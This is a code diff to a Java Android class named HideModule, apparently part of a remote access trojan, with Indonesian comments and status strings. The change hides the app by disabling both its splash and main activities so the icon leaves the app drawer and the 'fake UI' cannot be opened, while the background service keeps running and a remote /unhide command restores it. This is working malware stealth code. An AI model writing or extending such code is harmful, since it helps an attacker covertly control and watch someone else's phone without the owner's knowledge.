@@ -15,30 +15,46 @@ public class HideModule {
     public String hide() {
         try {
             PackageManager pm = ctx.getPackageManager();
-            ComponentName cn = new ComponentName(ctx, MainActivity.class);
-            pm.setComponentEnabledSetting(cn,
+
+            // Disable SplashActivity — biar ilang dari app drawer
+            ComponentName splash = new ComponentName(ctx, SplashActivity.class);
+            pm.setComponentEnabledSetting(splash,
                     PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                     PackageManager.DONT_KILL_APP);
+
+            // Disable MainActivity — biar UI palsu gak bisa dibuka
+            ComponentName main = new ComponentName(ctx, MainActivity.class);
+            pm.setComponentEnabledSetting(main,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP);
+
             return "RAT HIDE TOTAL.\n"
                     + "- Service: Jalan\n"
                     + "- Icon: Gak ada di app drawer\n"
-                    + "- Buka app: cuma via ADB\n\n"
-                    + "Kirim /unhide via Telegram untuk munculin lagi.";
+                    + "- UI: Gak bisa dibuka\n\n"
+                    + "Kirim /unhide untuk munculin lagi.";
         } catch (Exception e) {
-            return "Error: " + e.getMessage();
+            return "Error hide: " + e.getMessage();
         }
     }
 
     public String unhide() {
         try {
             PackageManager pm = ctx.getPackageManager();
-            ComponentName cn = new ComponentName(ctx, MainActivity.class);
-            pm.setComponentEnabledSetting(cn,
+
+            ComponentName splash = new ComponentName(ctx, SplashActivity.class);
+            pm.setComponentEnabledSetting(splash,
                     PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                     PackageManager.DONT_KILL_APP);
-            return "Icon dimunculkan lagi. Cek app drawer HP kedua.";
+
+            ComponentName main = new ComponentName(ctx, MainActivity.class);
+            pm.setComponentEnabledSetting(main,
+                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                    PackageManager.DONT_KILL_APP);
+
+            return "Icon muncul lagi. Cek app drawer HP kedua.";
         } catch (Exception e) {
-            return "Error: " + e.getMessage();
+            return "Error unhide: " + e.getMessage();
         }
     }
 }
